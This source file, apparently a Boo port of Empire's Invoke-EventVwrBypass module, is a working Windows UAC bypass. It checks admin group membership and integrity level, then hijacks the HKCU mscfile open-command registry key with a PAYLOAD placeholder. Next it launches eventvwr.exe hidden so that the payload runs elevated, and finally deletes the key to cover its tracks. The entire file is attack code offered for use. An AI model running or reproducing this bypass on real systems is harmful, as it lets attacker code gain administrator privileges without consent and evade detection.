/*
https://gist.github.com/leoloobeek/c88579d9102641ebf5bf9f8d7ba4984c
https://github.com/EmpireProject/Empire/blob/master/data/module_source/privesc/Invoke-EventVwrBypass.ps1
*/

import System
import System.Threading
import System.Diagnostics
import Microsoft.Win32

public static def Main():

    ConsentPrompt = Registry.GetValue(`HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`, "ConsentPromptBehaviorAdmin", null)
    SecureDesktopPrompt = Registry.GetValue(`HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`, "PromptOnSecureDesktop", null)

    if ConsentPrompt == 2 and SecureDesktopPrompt == 1:
        print "UAC is set to 'Always Notify'. This module does not bypass this setting."
        return

    whoamiOutput = shell("whoami", "/groups")

    if not @/S-1-5-32-544/.IsMatch(whoamiOutput):
        print "[!] Current user not a local administrator!"
        return

    if not @/S-1-16-8192/.IsMatch(whoamiOutput):
        print "[!] Not in a medium integrity process!"
        return

    key as RegistryKey = Registry.CurrentUser.CreateSubKey(`Software\Classes\mscfile\shell\open\command`, true)
    key.SetValue("(Default)", `PAYLOAD`, RegistryValueKind.String)
    key.Close()

    print "Key has been created"

    print "Event Viewer is starting up"
    p as Process = Process()
    p.StartInfo.FileName = `C:\Windows\System32\eventvwr.exe`
    p.StartInfo.CreateNoWindow = true
    p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden
    p.Start()

    Thread.Sleep(5000)

    try:
        print "Killing Event Viewer"
        p.Kill()
    except e as Exception:
        print "Event Viewer no longer running"

    print "Cleaning up..."
    key = Registry.CurrentUser.OpenSubKey(`Software\Classes`, true)
    key.DeleteSubKeyTree("mscfile")
    key.Close()

    print "Complete"
